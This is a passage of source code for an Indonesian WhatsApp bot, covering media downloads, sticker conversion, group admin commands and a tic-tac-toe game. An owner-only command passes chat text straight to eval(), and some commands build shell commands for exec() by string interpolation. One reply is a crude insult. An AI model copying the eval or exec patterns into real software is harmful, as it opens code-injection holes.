								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdreply:{title:title,body:" YTMP3",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
					        })
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'stickertele':
						case 'stickertelegram':
              if(isGroup)return reply(`Di Chat Pribadi Aja Om`)
if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
ini_txt = args.join(" ")
get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${ini_txt}`)
get_result = get_result.result[0].stickers
for (var x of get_result) {
ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`)
Fan.sendMessage(from, ini_buffer, sticker)
}
break
						  case 'playy':
						  if (args.length == 0) return reply(`Example: ${prefix + command} vide 1detik`)
            queryy = args.join(" ")
if (args.length == 0) return reply(`Example: ${prefix + command} vide 1detik`)
            queryy = args.join(" ")
            get_resultL = await fetchJson(`https://api.lolhuman.xyz/api/ytplay2?apikey={lolkey}&queryy=${queryy}`)
            get_resultP = get_resultL.result
            textP =`
*YOUTUBE PLAY*

Judul : ${get_resultP.title}

*UNTUK MEMUTAR LAGU KLIK LINK DIBAWAH*
*ATAU MENUNGGU*
Link : ${get_resultP.audio}
            `
            Fan.sendMessage(from, textP, text,{contextInfo:{
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdreply": {
            "title": `Hallo ${pushname}` ,
            "body": `Nih ${queryy} nya`,
            "mediaType": "2",
            "thumbnailUrl": `${get_resultP.image_thumbnail}`,
            "mediaUrl": "https://youtu.be/4AJ0lmLXouc",
            "thumbnail": fs.readFileSync("./P3/logonya2.jpeg"),
            "sourceUrl": "http://fanstore.xyz"
            },mentionedJid:[sender]}, quoted : mek})
            get_audio = await getBuffer(get_resultP.audio)
            Fan.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_resultP.title}.mp3`, quoted: mek})
            break
						case 'ytdl':
					case 'play':
				  if(isGroup)return reply(`Di Chat Pribadi Aja Om`)
		 if (!q) return reply('Linknya?')
			 let query = args.join(" ")
			 res = await yts(q)
			   let thumbInfo = ` 
*Youtube Download*
 * 📑Judul :* ${res.all[0].title}
 *📑ID Video :* ${res.all[0].videoId}
 *📑 Diupload Pada :* ${res.all[0].ago}
 *📑 Views :* ${res.all[0].views}
 *📑Durasi :* ${res.all[0].timestamp}
 *📑 Channel :* ${res.all[0].author.name}
 *🔗 Link Video :* ${res.all[0].url}

*Silahkan pilih media yang akan di download*
`
buttons = [{buttonId:`.ytmp3 ${res.all[0].url}`,buttonText:{displayText:'🎵AUDIO'},type:1},{buttonId:`ytmp4 ${res.all[0].url}`,buttonText:{displayText:'MP4📰'},type:1}]

imageMessage = (await Fan.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage

buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}

prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{})

Fan.relayWAMessage(prep)
break
						  
                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
					case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':			
					     if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await Fan.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                Fan.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await Fan.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
              
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            Fan.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break
					case 'stickerwm':
					case 'swm':
            
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await Fan.downloadAndSaveMediaMessage(encmedia, `./P1/sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./P1/sticker/stickwm_${sender}.exif ./P1/sticker/${sender}.webp -o ./P1/sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											Fan.sendMessage(from, fs.readFileSync(`./P1/sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./P1/sticker/${sender}.webp`)	
											fs.unlinkSync(`./P1/sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./P1/sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await Fan.downloadAndSaveMediaMessage(encmedia, `./P1/sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(`Bentar Nyett....`)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./P1/sticker/stickwm_${sender}.exif ./P1/sticker/${sender}.webp -o ./P1/sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											Fan.sendMessage(from, fs.readFileSync(`./P1/sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./P1/sticker/${sender}.webp`)
											fs.unlinkSync(`./P1/sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./P1/sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'takestick':
					case 'take':
            
						if (!isQuotedSticker) return reply(`reply sticker dengan caption *${prefix}takestick nama|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await Fan.downloadAndSaveMediaMessage(encmedia, `./P1/sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./P1/sticker/takestick_${sender}.exif ./P1/sticker/${sender}.webp -o ./P1/sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							Fan.sendMessage(from, fs.readFileSync(`./P1/sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./P1/sticker/takestick_${sender}.exif`)
						})
						break
						case 'toimg':
              if (!isQuotedSticker) return reply('reply stickernya')
              reply(mess.wait)
              encmedia_nya = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media_nya = await Fan.downloadAndSaveMediaMessage(encmedia_nya)
              rani_nya = getRandom('.png')
              exec(`ffmpeg -i ${media_nya} ${rani_nya}`, (err) => {
              fs.unlinkSync(media_nya)
              if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
              buffer = fs.readFileSync(rani_nya)
              Fan.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih'})
              fs.unlinkSync(rani_nya)
})
              break
			case 'speed':
			case 'ping':
ini_txt = `Xavhier Bot Merespon Dalam ${latensyi.toFixed(4)} DETIK
`
reply(ini_txt)
break
				case 'return':
				if (!isOwner) return reply(`Khusus Owner Om`)
					return Fan.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return Fan.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
                 break
              
				case 'ss':
            
              reply(`Bentar Nyett....`)
					buff = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${lolkey}&url=${args[0]}`)
					Fan.sendMessage(from, buff, image, {thumbnail: Buffer.alloc(0), caption: `Nih Om`, quoted : ftrol})
					break
				break
				case 'addsticker':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					if (!isQuotedSticker) return reply('reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Fan.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./P3/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./P2/setik.json', JSON.stringify(setik))
					Fan.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./P3/sticker/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
            
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					Fan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					if (!isQuotedAudio) return reply('reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Fan.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./P3/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./P2/vien.json', JSON.stringify(vien))
					Fan.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./P3/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
            
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					Fan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					if (!isQuotedImage) return reply('reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Fan.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./P3/image/${nm}.jpg`, delb)
					fs.writeFileSync('./P2/imagi.json', JSON.stringify(imagi))
					Fan.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./P3/image/${nmm}.jpg`)
					 reply(`Sukses menghapus image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
            
					teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					Fan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
            
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await Fan.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./P3/sticker/${wanu[1]}.webp`)
				Fan.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
				case 'cekspeed':					
reply(`KECEPATAN BOT: ${latensyi.toFixed(4)} DETIK`)
break
				case 'runtime':

        if(menusimpel == false){               
                runtime = process.uptime()
       
       menu = ` BOT TELAH AKTIF SELAMA:${waktu(runtime)}
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply3,name:""}, [{buttonId:`owner`,buttonText:{displayText:'OWNER THIS BOT'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
			
			case 'setbio':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					Fan.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'setname':
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                Fan.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break                
             case 'add':
             reply(`*Punya Tangan Kan kontol? Kalo Punya Ya Dipake Anjengg*`)
             break
	
				case 'kick':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('reply targetnya!')
			kick = mek.message.extendedTextMessage.contextInfo.participant
		    Fan.groupRemove(from, [kick])
						reply('Sukses mengeluarkan peserta')
						
                    break
                    case 'creategroup':
			case 'creategrup':
            
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					Fan.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
            case 'welcome': 
            
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return reply(`Khusus Admin Om`)
					if (args[0] === 'on') {
						if (isWelkom) return reply('Sudah Aktif Kak')
						welkom.push(from)
						fs.writeFileSync('./P2/welkom.json', JSON.stringify(welkom))
						reply('Sukses mengaktifkan fitur welcome')
					} else if (args[0] === 'off') {
						if (!isWelkom) return reply('Sudah Mati Kak')
						var ini = welkom.indexOf(from)
						welkom.splice(ini, 1)
						fs.writeFileSync('./P2/welkom.json', JSON.stringify(welkom))
						reply('Sukses menonaktifkan fitur welcome')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'welcome off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'welcome on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btngrass = {
    contentText: `${anu}`,
    footerText: '*_©Xavhier ゑ_*',
    buttons: punten,
    headerType: 1
}
await Fan.sendMessage(from, btngrass, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
				case 'listrespon':
            
teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
		default:break
		}
		if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Giliran = @${tty.player1.split('@')[0]}`
  Fan.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
Fan.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Result Game Tictactoe 🎲

*Yeyyy Permainan Di Menangkan Oleh *@${tty.player1.split('@')[0]}*\n`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Fan.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri 🗿👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❌

${ttt}

Giliran = @${tty.player2.split('@')[0]}`
 Fan.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*?? Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh *@${tty.player2.split('@')[0]}*\n`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Fan.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Giliran = @${tty.player1.split('@')[0]}`
 Fan.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('|ERR|', 'red'), color(e, 'cyan'))
     Fan.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdreply:{title: "Developer Xavhier ゑ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/logonya.jpeg'),sourceUrl:"https://wa.me/628979185922"}}})
	}
    }
    }
    }
    }
    }
    }
    